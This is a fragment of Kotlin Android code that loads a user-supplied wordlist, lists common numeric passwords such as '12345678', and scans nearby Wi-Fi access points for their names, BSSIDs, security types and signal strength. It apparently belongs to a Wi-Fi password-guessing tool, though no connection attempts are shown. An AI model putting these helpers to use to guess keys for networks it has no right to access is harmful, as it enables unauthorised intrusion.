private fun readWordlistFromUri(context: Context, uri: Uri): List<String> {
    return runCatching {
        context.contentResolver.openInputStream(uri)?.use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        } ?: emptyList()
    }.getOrElse { emptyList() }
}

private fun generateNumericPatterns(): List<String> {
    return listOf(
        "12345678", "123456789", "1234567890", "00000000", "11111111",
        "22222222", "33333333", "44444444", "55555555", "66666666",
        "77777777", "88888888", "99999999", "11223344", "22446688"
    )
}

private fun isLocationServiceEnabled(context: Context): Boolean {
    val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return true
    return runCatching {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lm.isLocationEnabled
        } else {
            @Suppress("DEPRECATION")
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                @Suppress("DEPRECATION")
                lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        }
    }.getOrDefault(true)
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun readScanResultsOnly(context: Context): List<ScannedWifiNetwork> {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return emptyList()
    val results = runCatching { wifiManager.scanResults }.getOrNull().orEmpty()
    return results
        .filter { !it.SSID.isNullOrBlank() }
        .distinctBy { "${it.SSID}_${it.BSSID}" }
        .sortedByDescending { it.level }
        .map { sr ->
            val pct = WifiManager.calculateSignalLevel(sr.level, 100).coerceIn(5, 100)
            ScannedWifiNetwork(
                ssid = sr.SSID,
                bssid = sr.BSSID ?: "00:00:00:00:00:00",
                capabilities = sr.capabilities ?: "[WPA2-PSK]",
                signalPercent = pct
            )
        }
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun performRealWifiScan(context: Context): ScanOutcome {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return ScanOutcome(emptyList(), "Found 0 APs")

    if (!wifiManager.isWifiEnabled) {
        return ScanOutcome(emptyList(), "Turn Wi-Fi ON")
    }

    if (!isLocationServiceEnabled(context)) {
        return ScanOutcome(emptyList(), "Turn Location ON")
    }

    runCatching { wifiManager.startScan() }
    val list = readScanResultsOnly(context)
    return ScanOutcome(
        networks = list,
        summary = "Found ${list.size} APs"
    )
}

private fun inspectNetworkState(context: Context): String {
    val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val active = cm.activeNetwork ?: return "Disconnected"
    val caps = cm.getNetworkCapabilities(active) ?: return "Limited"
    val transport = when {
        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
        else -> "Other"
    }
    val internet = if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) "Internet" else "Local"
    return "$transport ($internet)"
}